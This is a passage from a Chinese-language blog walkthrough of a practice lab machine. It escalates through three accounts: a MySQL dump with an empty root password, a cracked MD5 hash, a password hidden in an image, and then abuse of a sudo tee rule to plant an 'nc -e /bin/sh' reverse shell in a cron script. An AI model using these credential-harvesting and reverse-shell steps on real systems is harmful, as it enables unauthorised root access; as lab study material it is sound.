+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516102518155.png" srcset="/img/loading.gif" lazyload></p>
+<p>可见两个引起注意的用户：milton和blumbergh</p>
+<h3 id="提权到milton用户"><a href="#提权到milton用户" class="headerlink" title="提权到milton用户"></a>提权到milton用户</h3><p>进一步发现服务器上安装了mysql，此时思路是获取mysql的登陆密码，从而查询用户的登陆信息</p>
+<p>进入到网站目录&#x2F;var&#x2F;www&#x2F;  发现一个5446目录，进入查看存在特殊文件名文件</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516102704604.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看文件可知该文件存储了mysql的root用户登陆信息，密码为空。接下来尝试登陆mysql，执行netstat -nlpt|grep 3306可知mysql监听地址为127.0.0.1仅本地访问，所以只能再本地查询mysql</p>
+<div class="code-wrapper"><pre><code class="hljs awk">mysql -u root -p
+use mysql;
+select user,password from user;
+<span class="hljs-keyword">exit</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103008017.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103129076.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103106688.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现一个和milton用户相关的信息</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">milton</span>  <span class="hljs-number">6450</span>d89bd3aff1d893b85d3ad65d2ec2
+</code></pre></div>
+
+<p>对该值进行md5解密，获得</p>
+<div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">thelaststraw</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515165339025.png" srcset="/img/loading.gif" lazyload></p>
+<p>切换到milton用户</p>
+<div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">su - milton</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103238718.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现该用户没有sudo权限</p>
+<h3 id="提权到blumbergh用户"><a href="#提权到blumbergh用户" class="headerlink" title="提权到blumbergh用户"></a>提权到blumbergh用户</h3><p>查看milton用户的历史命令</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103633697.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现有登陆过blumbergh用户的记录，结合&#x2F;etc&#x2F;passwd下的用户描述，跟Bill有关，之前网站上就有出现过这个Bill这个名字</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103747952.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103846859.png" srcset="/img/loading.gif" lazyload></p>
+<p>并且在网站根目录&#x2F;var&#x2F;www&#x2F;html&#x2F;下还发现了images，里面也有bill相关的图片bill.png</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230516103952885.png" srcset="/img/loading.gif" lazyload></p>
+<p>图片提示需要查看源码，此时可以用strings命令将图片中的可打印字符输出到文本中查看</p>
+<div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">strings</span> bill.png &gt;&gt; <span class="hljs-literal">info</span>.txt
+cat <span class="hljs-literal">info</span>.txt
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515172538506.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515172846453.png" srcset="/img/loading.gif" lazyload></p>
+<p>出现一个完整的单词，推测是blumbergh用户的密码</p>
+<div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">coffeestains</span>
+</code></pre></div>
+
+<p>使用该密码登陆blumbergh用户，成功登陆到blumbergh用户</p>
+<div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">su - blumbergh</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515173035264.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="提权到root用户"><a href="#提权到root用户" class="headerlink" title="提权到root用户"></a>提权到root用户</h3><p>查看blumbergh用户的sudo权限</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515173223321.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现blumbergh用户可以以root用户身份免密执行&#x2F;usr&#x2F;bin&#x2F;tee &#x2F;usr&#x2F;share&#x2F;cleanup&#x2F;tidyup.sh</p>
+<p>查看&#x2F;usr&#x2F;share&#x2F;cleanup&#x2F;tidyup.sh文件的内容</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515173444862.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据描述信息可知该脚本每3分钟会执行一次为了防止黑客，执行的命令是将tomcat的应用进行删除，这就解释了为什么war包上传后隔一段时间就找不到</p>
+<p>此处可利用tee命令将反弹shell命令写入到&#x2F;usr&#x2F;share&#x2F;cleanup&#x2F;tidyup.sh脚本中</p>
+<p>先在kali上开启端口监听</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">7777</span>
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515174411738.png" srcset="/img/loading.gif" lazyload></p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/sh 192.168.110.128 7777 0&gt;&amp;1&quot;</span> &gt;&gt; shell.txt
+<span class="hljs-built_in">cat</span> shell.txt| <span class="hljs-built_in">sudo</span> /usr/bin/tee /usr/share/cleanup/tidyup.sh
+</code></pre></div>
+
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515174505782.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功将反弹shell命令写入tidyup.sh脚本，等待定时任务的执行</p>
+<p>等待一段时间后，7777端口成功接收到shell</p>
+<p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230515174815383.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h1><p>利用python导入反弹shell的终端：python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>将keystore文件转换成tls证书解密https流量</p>
+<p>利用tomcat特性使用war生成webshell</p>
+<p>利用tee写入反弹shell</p>
+<h1 id="工具整理"><a href="#工具整理" class="headerlink" title="工具整理"></a>工具整理</h1>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/" class="category-chain-item">靶场实验</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/PHP/PDO/" title="PDO连接数据库">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PDO连接数据库</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C/ch4inrulz-101247/" title="ch4inrulz-101247">
+                        <span class="hidden-mobile">ch4inrulz-101247</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
